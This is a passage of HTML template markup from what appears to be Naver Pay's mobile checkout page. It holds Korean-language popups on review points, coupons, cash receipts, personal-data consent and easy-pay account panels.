								<button type="button" class="N=a:ode.closerev npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideLayerReviewMileage()) _stopDefault"><span>닫기</span></button>
							</div>
						</div>
						<script type="text/template" class="_tpl_layer_review_mileage">
							<p class="txt">
								∙ 텍스트 리뷰와 포토/동영상 리뷰 적립 혜택은 중복으로 지급되지 않으며, 포토/동영상 리뷰 작성 포인트는 최초 작성 시 포토/동영상을 첨부할 경우에만 적립됩니다.
							</p>
							{set afterUseReviewExists = "N"}
							{for index:item in items}
								{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
									{set afterUseReviewExists = "Y"}
								{/if}
							{/for}
							{if afterUseReviewExists == "Y"}
								<p class="txt">
									∙ 한달사용 리뷰 작성 추가 포인트는 구매확정 이후 30일까지 리뷰를 작성하고, 한달사용 리뷰를 추가로 작성할 때만 지급됩니다.
								</p>
							{/if}
							<p class="txt">
								∙ 동일 상품(상품번호 기준)에 대한 리뷰 적립 혜택은 리뷰/한달사용 리뷰 각각 1회로 제한되며, 적립 후 30일 경과 시 리뷰 적립혜택을 다시 받을 수 있습니다.
							</p>
							<p class="txt">
								∙ 상품 결제금액 기준 3,000원 미만인 경우 리뷰 작성에 대한 포인트 적립이 제외됩니다.
							</p>
							<p class="txt">
								∙ 상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만(마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.
							</p>
							<ul class="benefit_lst review">
								{for index:item in items}
								<li class="benefit_item">
									<div class="tmb">
										<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH+A1BTQQAsAAAAAAEAAQAAAgJEAQA7" alt="{=item.productName}" data-src="https://m.pay.naver.com{=item.imageUrl}?type=m120" data-error-src="https://img-shop.pstatic.net/front/common/noimg/no_img_120x120.jpg" width="40" height="40"/>
									</div>
									<div class="inr">
										<strong class="tit">{=item.productName}</strong>
										{set commaNormalTextReviewMileage=pug.utility.convertNumberFormat(=item.textReviewMileage.NORMAL)}
										{set commaNormalPhotoVideoPurchaseReviewMileage=pug.utility.convertNumberFormat(=item.photoVideoReviewMileage.NORMAL)}
										{set commaAfterUseTextReviewMileage=pug.utility.convertNumberFormat(=item.textReviewMileage.AFTER_USE)}
										{set commaAfterUsePhotoVideoPurchaseReviewMileage=pug.utility.convertNumberFormat(=item.photoVideoReviewMileage.AFTER_USE)}
										{set commaSubscriberReviewMileage=pug.utility.convertNumberFormat(=item.subscriberReviewMileage)}
										{if (item.textReviewMileage.NORMAL > 0) || (item.photoVideoReviewMileage.NORMAL > 0)}
											<em class="subtit">리뷰 작성 시 포인트 안내</em>
										{/if}
										{if item.textReviewMileage.NORMAL > 0}
											<span class="detail"><span class="review_txt">텍스트 리뷰</span><span class="fr"><strong>{=commaNormalTextReviewMileage}</strong>원</span></span>
										{/if}
										{if item.photoVideoReviewMileage.NORMAL > 0}
											<span class="detail"><span class="review_txt">포토/동영상 리뷰</span><span class="fr"><strong>{=commaNormalPhotoVideoPurchaseReviewMileage}</strong>원</span></span>
										{/if}
										{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
											<em class="subtit">한달사용 리뷰 작성 시 추가 포인트 안내</em>
										{/if}
										{if item.textReviewMileage.AFTER_USE > 0}
											<span class="detail"><span class="review_txt">텍스트 리뷰</span><span class="fr"><strong>{=commaAfterUseTextReviewMileage}</strong>원</span></span>
										{/if}
										{if item.photoVideoReviewMileage.AFTER_USE > 0}
											<span class="detail"><span class="review_txt">포토/동영상 리뷰</span><span class="fr"><strong>{=commaAfterUsePhotoVideoPurchaseReviewMileage}</strong>원</span></span>
										{/if}
										{if item.subscriberReviewMileage > 0}
											<span class="detail talktalk"><span class="review_txt">톡톡친구/스토어찜 고객 포인트 추가지급</span><span class="fr"><strong>{=commaSubscriberReviewMileage}</strong>원</span></span>
										{/if}
									</div>
								</li>
								{/for}
							</ul>
						</script>
						
						<div class="ly_bx _layer_firsteasypayuser_mileage" style="top:20px;display:none;">
							<dl class="benefit_wrap benefit_wrap2 _content">
							</dl>
							<div class="cls_btn cls_btn_v2">
								<a href="#" class="_click(checkout.mobile.order.order_sheet.hideLayerFirstEasyPayUserMileage()) _stopDefault">닫기</a>
							</div>
						</div>
						<script type="text/template" class="_tpl_layer_firsteasypayuser_mileage">
							<dt>
								<span class="sp_spot_benefit npay">네이버페이</span> 간편결제 {=paymentMeansType} 첫 {=npayEventType} 혜택
							</dt>
							<dd>
								<p class="txt">네이버페이 <span class="point_color">간편결제 {=paymentMeansType} 첫 {=npayEventType}</span>시 현금처럼 사용가능한 네이버페이 포인트 <span class="point_color">{=npayEventMileageAmountText}</span>원을 즉시 지급해드립니다.</p>
								<p class="txt">{=npayEventType}완료 이후 네이버페이 포인트 지급내역을 바로 확인하실 수 있습니다.<br><a href="https://event2.pay.naver.com/v/m/event/benefit/list{if npayEventType=="등록"}#FIRST_REGISTER{else}#FIRST_USE{/if}" class="btn_txt">자세히보기</a></p>
							</dd>
						</script>
						
						<div class="ly_dim2 _benefitAndCoupon" style="display:none;">&nbsp;</div>
						<div class="pop_wrap _benefitAndCoupon _benefitAndCouponContent" style="top:80px;display:none;">
							<h1>쿠폰 이용안내</h1>
							<div class="ly_cont _benefitAndCouponDiv" style="height:auto;">
								<div id="benefitAndCouponContents">
									<div>
										<strong>쿠폰 이용 안내</strong>
										<ul class="dotlist">
											<li>판매자 쿠폰과 네이버 페이 쿠폰을 각각 1개씩 동시에 사용 가능하며, 스토어찜 할인을 판매자 즉시할인이 선택된 경우에 한하여 판매자별로 1종류 상품에만 사용 가능합니다. </li>
											<li>쿠폰마다 사용제한 조건이 다를 수 있습니다. (적용대상 상품/최대 할인금액/최소 주문금액 등)</li>
											<li>자세한 내용은 [내 쿠폰 목록] 탭에서 확인하실 수 있습니다.</li>
											<li>쿠폰을 사용한 주문을 취소하여 쿠폰사용이 취소된 경우 유효기간 내에서 재발급 되며, 유효기간이 3일 미만 남았거나 지난 경우는 1회 취소일로부터 + 3일로 쿠폰이 재발급 됩니다. </li>
										</ul>
										<div class="_click(checkout.mobile.order.order_sheet.showCouponUsage()) _stopDefault">
											<a href="#" class="b_defn"><div>쿠폰 이용 안내 자세히 보기</div><span class="btall"></span></a>
										</div>
									</div>
								</div>
							</div>
							<a href="#" class="b_del3 _click(checkout.mobile.order.order_sheet.hideBenefitAndCouponLayer()) _stopDefault">닫기</a>
							<div class="mas_gra"></div>
						</div>
						
						<div class="wrap_layer _giftingOrderLayer" style="display:none;">
							<div class="layer_content layer_gift_send">
								<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/im/ordersheet/img_gift_send_layer.png?20200130" width="300" height="297" alt="주소를 몰라도 바로 선물 가능! 카카오톡, 휴대폰 연락처로 받는 사람 선택 후 상품 결제. 받는 사람이 배송지 직접 입" class="banner_img">
								<div class="btn_area">
									<a href="#" class="N=a:ode.giftgo btn_gift _click(checkout.mobile.order.order_sheet.switchToGiftingOrder()) _stopDefault"><b class="link">지금 고른 상품 선물하기</b></a>
								</div>
								<button type="button" class="btn_layer_close _click(checkout.mobile.order.order_sheet.hideGiftingOrderLayer()) _stopDefault"><span class="blind">닫기</span></button>
							</div>
						</div>
						
						<div class="wrap_layer _ecouponGiftingOrderLayer" style="display:none;">
							<div class="layer_content layer_gift_send_2">
								<strong class="popup_title">이 상품을 선물하세요</strong>
								<p>네이버ID, 휴대폰 번호, 카카오톡으로<br> 간편하게 보낼 수 있습니다.</p>
								<a href="#" class="N=a:ode.egiftgo npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.switchToGiftingOrder()) _stopDefault">선물하기</a>
								<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideEcouponGiftingOrderLayer()) _stopDefault">취소</button>
							</div>
						</div>
						
						<div class="ly_bx layer_cash_receipt_info" style="top: 560px; display:none;">
							<div class="layer_box_inner cash_receipt">
								<strong class="layer_title">현금영수증 발급안내</strong>
								<div class="layer_content">
									<ul class="guide_list">
										<li class="square_bullet">현금영수증은 <span class="point_green">구매확정일 기준</span>으로 발급됩니다.</li>
										<li class="square_bullet">현금영수증 신청정보는 구매확정 전까지 변경이 가능하며, [주문상세정보 &gt; 결제금액정보]의 ‘현금영수증 정보변경’을 통해 수정하실 수 있습니다.</li>
										<li class="square_bullet">네이버페이 포인트로 결제한 경우 현금영수증 신청을 하였더라도 <span class="point_green">신용카드/무통장입금/계좌이체/상품권으로 충전한 충전포인트 금액에 대해서만</span> 현금영수증을 발급합니다.</li>
										<li class="square_bullet">현금영수증에는 개인소득공제용과 사업자증빙용이 있으며, <span class="point_green">세금계산서가 필요하신 경우 사업자증빙용 현금영수증을 신청해주시면 됩니다.</span></li>
										<li class="square_bullet"><span class="point_green">현금영수증(사업자증빙용)은</span> 법인세법 116조 2항 및 부가가치세법 23조 2의 3항에 의해 <span class="point_green">세금계산서와 동일한 자격 및 효력이 있습니다.</span></li>
										<li class="square_bullet">발급된 현금영수증은 네이버페이 PC웹에서 확인 및 출력하실 수 있습니다.</li>
									</ul>
								</div>
								<div class="layer_footer">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideCashReceiptInfoLayer()) _stopDefault"><span>닫기</span></button>
								</div>
							</div>
						</div>
						
						<script type="text/template" class="_tpl_layer_blackconsumer">
							<div class="dimmed _blackconsumerNoticeDimmed"></div>
							<div class="ly_bx _blackconsumerNotice">
								<div class="ly_cont">
									<strong class="pop_tit">구매불가 상품 안내</strong>
									{if customerCenterTelNo != null}
										<p class="pop_notice">회원님은 해당 판매자의 상품 구매가 불가<br>합니다. 자세한 사항은 판매자에게 문의하여<br> 주시기 바랍니다.<br><em class="point_green">{=merchantName}({=customerCenterTelNo})</em></p>
									{else}
										<p class="pop_notice">회원님은 해당 판매자의 상품 구매가 불가<br>합니다. 자세한 사항은 상품 Q&A를 통해<br> 판매자에게 문의하여 주시기 바랍니다.<br></p>
									{/if}
									<div class="pop_btnarea">
										<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideDimmedLayer(blackconsumerNotice)) _stopDefault">확인</button>
									</div>
									<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideDimmedLayer(blackconsumerNotice)) _stopDefault"><span class="blind">팝업닫기</span></button>
								</div>
							</div>
						</script>
						
						<script type="text/template" class="_tpl_layer_point_charge">
							<div class="point_link">
								<a href="{=detailLink}" class="N=a:ode.pointchc view_charge">{=message}</a>
							</div>
						</script>
						
						<div class="ly_bx _layer_hopeDeliveryFee" style="top: 560px; display:none;">
							<div class="ly_cont">
							</div>
						</div>
						<script type="text/template" class="_tpl_layer_hopeDeliveryFee">
							<strong class="pop_tit">희망일배송 지역별 배송비</strong>
							<p class="pop_notice">
								{for index:text in hopeDeliveryFeeTexts}
									{=text}<br />
								{/for}
								추가 비용은 착불 등을 통해 별도 지불<br>(판매자 확인 가능)</p>
							<div class="pop_btnarea">
								<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideHopeDeliveryFee()) _stopDefault">확인</button>
							</div>
							<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideHopeDeliveryFee()) _stopDefault"><span class="blind">팝업닫기</span></button>
						</script>
						
						<div class="ly_bx agreement _C1AgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
								<div class="area_description">
									<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 네이버페이 가맹점에서 제공하는 상품 및 서비스를 구매하고자 할 경우, 네이버파이낸셜㈜는 거래 당사자간 원활한 의사소통 및 배송, 상담 등 거래이행을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
									<ul class="list_description">
										<li class="item_description">
											1. 개인정보를 제공받는 자
											<p class="point_text">상품 및 서비스 판매자</p>
										</li>
										<li class="item_description">
											2. 제공하는 개인정보 항목
											<p>이름, 네이버 아이디, (휴대)전화번호, 상품 수령인 정보(배송상품 : 수령인명, 주소, (휴대)전화번호 / E쿠폰 : 이름, 네이버 아이디, 휴대전화번호), 결제정보(결제수단, 결제금액, 결제일시, 승인유무, 승인번호)</p>
										</li>
										<li class="item_description">
											3. 개인정보를 제공받는 자의 이용목적
											<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 새로운 상품/서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
										</li>
										<li class="item_description">
											4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
											<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
										</li>
									</ul>
									<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 상품 및 디지털 콘텐츠 구매가 불가능합니다. 그 밖의 내용은 네이버페이 가맹점의 자체 이용약관 및 개인정보처리방침에 따릅니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C1AgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _C2AgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
								<div class="area_description">
									<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 네이버페이 가맹점에서 제공하는 상품 및 서비스를 구매하고자 할 경우, 네이버파이낸셜㈜는 거래 당사자간 원활한 의사소통 및 배송, 상담 등 거래이행을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
									<ul class="list_description">
										<li class="item_description">
											1. 개인정보를 제공받는 자
											<p class="point_text">상품 및 서비스 판매자</p>
										</li>
										<li class="item_description">
											2. 제공하는 개인정보 항목
											<p>이름, 네이버 아이디, (휴대)전화번호, 상품 구매정보,결제수단, 상품 수령인 정보 (배송상품:수령인명, 주소, (휴대)전화번호/ E쿠폰:이름, 네이버 아이디, 휴대전화번호)</p>
										</li>
										<li class="item_description">
											3. 개인정보를 제공받는 자의 이용목적
											<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 새로운 상품/ 서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
										</li>
										<li class="item_description">
											4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
											<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
										</li>
									</ul>
									<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 상품 및 디지털 콘텐츠 구매가 불가능합니다. 그 밖의 내용은 네이버페이 가맹점의 자체 이용약관 및 개인정보처리방침에 따릅니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C2AgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _C3AgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
								<div class="area_description">
									<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 안전결제 서비스를 이용하고자 할 경우, 네이버파이낸셜㈜는 당사자간 원활한 의사소통 및 서비스 제공을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
									<ul class="list_description">
										<li class="item_description">
											1. 개인정보를 제공받는 자
											<p class="point_text">상품 및 서비스 판매자</p>
										</li>
										<li class="item_description">
											2. 제공하는 개인정보 항목
											<p>이름, (휴대)전화번호, 주소</p>
										</li>
										<li class="item_description">
											3. 개인정보를 제공받는 자의 이용목적
											<p class="point_text">안전결제를 통한 거래 진행, 물품 배송</p>
										</li>
										<li class="item_description">
											4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
											<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
										</li>
									</ul>
									<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 안전결제 서비스 제공이 불가능합니다. 그 밖의 내용은 네이버파이낸셜 개인정보처리방침에 따릅니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C3AgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _customOrderAgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name">맞춤제작상품<br>구매/교환/반품/환불 제한 동의</strong>
								<div class="area_description" style="max-height:239px">
									<p class="agreement_description">맞춤제작상품이란? 본 상품은 맞춤제작상품으로 특정 주문자 만을 위하여 개별적으로 제작 및 생산되는 상품으로서, 다른 소비자에게 재판매가 불가능한 상품을 의미합니다.</p>
									<p class="agreement_description">·맞춤제작상품은 반품/취소 제한에 동의해야 결제가 진행되며 전자상거래법에 따라 반품/취소가 불가능 할 수 있습니다.</p>
									<p class="agreement_description">·다만, 맞춤제작상품으로 인정되지 않는 상품의 경우 구매자는 반품/취소 제한에 동의하였는지 여부를 불문하고 전자상거래 관련법령에 의거 보호를 받을 수 있습니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(customOrderAgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _iiomaDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name">국외이전 동의</strong>
								<div class="area_description">
									<p class="agreement_description">‘네이버(주)’와 ‘네이버파이낸셜(주)’는 회원님의 개인정보를 안전하게 처리하기 위해 최선을 다하고 있습니다. 네이버페이의 회원계정으로 해외사업자의 상품 또는 해외 주문 및 발주 시스템을 사용하는 가맹점 상품 주문시 아래의 개인정보 국외 이전 동의가 필요합니다. 자세히 읽은 후 동의하여 주시기 바랍니다.</p>
									<ul class="list_description">
										<li class="item_description">
											1. 이전되는 개인정보 항목
											<p>이름, 네이버아이디, (휴대)전화번호, 상품구매정보, 상품수령인정보(수령인명, 주소, (휴대)전화번호), 개인통관고유부호(통관 필요 상품 주문 시에만 해당)</p>
										</li>
										<li class="item_description">
											2. 이전되는 국가
											<p></p>
										</li>
										<li class="item_description">
											3. 이전 일시 및 방법
											<p>결제 완료 시 시스템(온라인)을 통한 제공</p>
										</li>
										<li class="item_description">
											4. 이전받는 자의 성명
											<p class="point_text"></p>
										</li>
										<li class="item_description">
											5. 정보관리책임자 연락처
											<p class="point_text"></p>
										</li>
										<li class="item_description">
											6. 개인정보 이용 목적
											<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 통관, 새로운 상품/서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
										</li>
										<li class="item_description">
											7. 개인정보 보유 · 이용 기간
											<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
										</li>
									</ul>
									<p class="agreement_description">정보주체는 위 개인정보 국외 이전 동의를 거부할 권리가 있으나, 동의 거부 시 서비스 제공에 제한을 받을 수 있습니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(iiomaDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _traditionalAlcoholAgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name">구매정보 제3자 제공 동의</strong>
								<div class="area_description">
									<ul class="list_description">
										<li class="item_description">
											1. 제공받는 자
											<p class="point_text">관할세무서</p>
										</li>
										<li class="item_description">
											2. 제공 항목
											<p>주문자 인적사항(이름, 생년월일, 주소), 주문정보(주문일자, 상품명 수량, 금액 등)</p>
										</li>
										<li class="item_description">
											3. 제공 목적
											<p class="point_text">국세청 고시에 따른 주류 통신판매 주문에 대한 분기별 명세서 제출</p>
										</li>
										<li class="item_description">
											4. 보유 및 이용기간
											<p class="point_text">국세청 고시 등 내부 기준에 따름</p>
										</li>
									</ul>
									<p class="agreement_description">정보 주체는 위 개인정보 제3자 제공 동의를 거부할 권리가 있습니다. 단, 동의하지 않을 경우 서비스 이용이 제한됩니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(traditionalAlcoholAgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx agreement _preOrderAgreementDetail" style="display: none">
							<div class="ly_cont">
								<strong class="agreement_name">예약구매 상품 구매 및<br>취소 관련 동의</strong>
								<div class="area_description" style="max-height:239px">
									<p class="agreement_description">예약구매 상품은 일정기간 동안 주문을 사전에 모집하고 주문기간이 종료된 후 예정된 일자에 일괄로 발송하는 형태의 사전예약 상품입니다.</p>
									<p class="agreement_description">·예약구매 상품의 특성상 주문종료 후 실제 발송일까지 시간이 소요될 수 있습니다. 발송예정일을 확인한 후 주문을 진행하여 주시기 바랍니다.</p>
									<p class="agreement_description">·예약구매 상품의 경우 주문기간동안 <em>최소 주문수량에 미달하는 경우 판매자에 의해 주문이 취소될 수 있습니다.</em></p>
									<p class="agreement_description">주문시점 위의 내용을 인지하고 주문을 진행하시기 바랍니다.</p>
								</div>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(preOrderAgreementDetail))">확인</button>
								</div>
							</div>
						</div>
						
						<script type="text/template" class="_tpl_easy_pay_card_info">
							<span class="type">{=sCardType}</span>
							<div class="card_name">
								<span class="card_no"><span class="blind">카드 뒤 4자리</span>({=sCardNo})</span>
								<p class="name"><span class="blind">카드명</span>{=sCardName}</p>
							</div>
						</script>
						
						<script type="text/template" class="_tpl_layer_bank_panel">
							<li class="flick-ct flick-ct-dmm _flickPanel" style="transition-property: -webkit-transform; transition-duration: 0ms; transform: translate(0px, 0px); float: left; width: 6.66666666666667%; left: 0%; z-index: 10;" data-code="{=bankCode}" data-account-key="{=accountKey}">
								<input type="hidden" class="_paymentMethod" value="{=bankCode}">
								<div class="flick-wrap">
									{if payPartnershipItemCode != null && payPartnershipItemCode != ""}
										{set easyPayBankClass = (=payPartnershipItemCode)}
									{else}
										{set easyPayBankClass = 'bank_' + (=bankCode)}
									{/if}
									<div class="simplepay_select {=easyPayBankClass}">
										<span class="sp_ordersheet button_checked"></span>
										{if isPayable}
											<div class="card_select bank sp_bank">
											<span class="blind">{=bankCode}</span>
												<strong class="account_name noname">
													{if nickName != null && nickName != ""}
														{=nickName}
													{elseif payPartnershipItemName != null && payPartnershipItemName != ""}
														{=payPartnershipItemName}
													{else}
														계좌번호
													{/if}</strong>
												<p class="card_number">{=maskedAccountNo}</p>
											</div>
										{else}
											<div class="card_select bank sp_bank disabled">
												<span class="blind">{=bankCode}</span>
												<span class="checking">점검중</span>
												<p class="disable_text">은행 시스템 점검으로 인해 해당 계좌로<br>간편결제를 이용하실 수 없습니다.</p>
											</div>
										{/if}
									</div>
								</div>
							</li>
						</script>
						
						<script type="text/template" class="_tpl_purchase_benefit">
							{set commaTotal=pug.utility.convertNumberFormat(=TOTAL)}
						
							<div class="benefit_summary">
								<strong>구매적립<button type="button" class="N=a:ode.beneinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerPayMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
								<em class="summary_num">총 {=commaTotal}원</em>
							</div>
						
							<ul class="inner_list">
								{set commaTotalPurchaseMileage=pug.utility.convertNumberFormat(=TOTAL_PURCHASE)}
								{set commaTotalAdditionalMileage=pug.utility.convertNumberFormat(=TOTAL_ADDITIONAL)}
								{set commaBankEventMileage=pug.utility.convertNumberFormat(=BANK_EVENT)}
								{set commaMembershipPoint=pug.utility.convertNumberFormat(=TOTAL_MEMBERSHIP)}
								{set commaTotalChargedPoint=pug.utility.convertNumberFormat(=TOTAL_CHARGED_POINT)}
								{set commaTotalChargedPointAdditional=pug.utility.convertNumberFormat(=TOTAL_CHARGED_POINT_ADDITIONAL)}
								{set commaTotalAdminAdditionalPoint=pug.utility.convertNumberFormat(=TOTAL_ADMIN_ADDITIONAL)}
						
								{if (TOTAL_PURCHASE > 0)}
								<li>
									<span class="benefit_name">기본적립</span>
									<span class="benefit_sum"><em>{=commaTotalPurchaseMileage}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_ADMIN_ADDITIONAL > 0)}
								<li>
										<span class="benefit_name">상품구매 추가적립</span>
									<span class="benefit_sum"><em>{=commaTotalAdminAdditionalPoint}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_SCM > 0)}
								{for item in items}
								{set commaSellerCustomerManagementMileage=pug.utility.convertNumberFormat(=item.amount)}
								<li>
									<span class="benefit_name">{=item.key}</span>
									<span class="benefit_sum"><em>{=commaSellerCustomerManagementMileage}</em>원</span>
								</li>
								{/for}
								{/if}
								{if (TOTAL_ADDITIONAL > 0)}
								<li>
									<span class="benefit_name">파워적립</span>
									<span class="benefit_sum"><em>{=commaTotalAdditionalMileage}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_INFLOW > 0)}
									{for inflowBenefit in inflowBenefits}
										{set commaInflowBenefitMileage=pug.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
										{if !inflowBenefit.mileage.membershipImageYn}
											<li>
												<span class="benefit_name">{=inflowBenefit.key}</span>
												<span class="benefit_sum"><em>{=commaInflowBenefitMileage}</em>원</span>
											</li>
										{/if}
									{/for}
								{/if}
								{if (BANK_EVENT > 0)}
								<li>
									<span class="benefit_name">첫 계좌 등록 시</span>
									<span class="benefit_sum"><em>{=commaBankEventMileage}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_INFLOW > 0)}
									{for inflowBenefit in inflowBenefits}
										{set commaInflowBenefitMileage=pug.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
										{if inflowBenefit.mileage.membershipImageYn}
											<li>
												<span class="benefit_name">{=inflowBenefit.key} <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span></span>
												<span class="benefit_sum"><em>{=commaInflowBenefitMileage}</em>원</span>
											</li>
										{/if}
									{/for}
								{/if}
								{if (TOTAL_CHARGED_POINT > 0)}
								<li>
									<span class="benefit_case">충전포인트 결제적립</span>
									<span class="benefit_sum"><em>{=commaTotalChargedPoint}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_CHARGED_POINT_ADDITIONAL > 0)}
								<li>
									<span class="benefit_case">네이버통장 추가적립</span>
									<span class="benefit_sum"><em>{=commaTotalChargedPointAdditional}</em>원</span>
								</li>
								{/if}
								{if (TOTAL_MEMBERSHIP > 0)}
								<li class="membership_item">
									<span class="benefit_name">멤버십 추가적립 <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span>
										
									</span>
									<span class="benefit_sum"><b>{=commaMembershipPoint}</b>원</span>
									<div class="_tpl_membership_help_layer tooltip_box tooltip_family" style="z-index:1000;display:none;">
										<dl class="lay_content _content"></dl>
										<a href="#" class="btn_close_layer type_new _click(checkout.mobile.order.order_sheet.hideMembershipItemHelp()) _stopDefault"><span class="blind">도움창 닫기</span></a>
									</div>
								</li>
								{/if}
							</ul>
						</script>
						
						<script type="text/template" class="_tpl_card_benefit s_benefit_item type_ellipsis">
							<div class="benefit_summary">
								<strong>혜택카드적립<button type="button" class="sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerCardBenefit())"><span class="blind">도움말</span></button></strong>
								{set cardBenefitPoint=pug.utility.convertNumberFormat(=commaCardBenefitPoint)}
								<em class="summary_num">최대 {=cardBenefitPoint}원</em>
							</div>
						</script>
						
						
						<script type="text/template" class="_tpl_review_benefit">
							{if (TOTAL > 0)}
								{set commaMaxReviewMilease=pug.utility.convertNumberFormat(=MAX_REVIEW_MILEASE)}
								<div class="benefit_summary">
									<strong>리뷰적립<button type="button" class="N=a:ode.revinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerReviewMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
									<em class="summary_num">최대 {=commaMaxReviewMilease}원</em>
								</div>
							{/if}
						</script>
						
						<script type="text/template" class="_tpl_register_account_benefit">
							{set commaBankEventMileage=pug.utility.convertNumberFormat(=BANK_EVENT)}
							<strong>등록적립<button type="button" class="sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerFirstEasyPayUserMileage(계좌,등록,{=BANK_EVENT})) _stopDefault"><span class="blind">도움말</span></button></strong>
							<ul class="inner_list">
								<li>
									<span class="benefit_name">첫 계좌 등록 시</span>
									<span class="benefit_sum"><b>{=commaBankEventMileage}</b>원</span>
								</li>
							</ul>
						</script>
						
						<script type="text/template" class="_tpl_review_benefit_guide_c1">
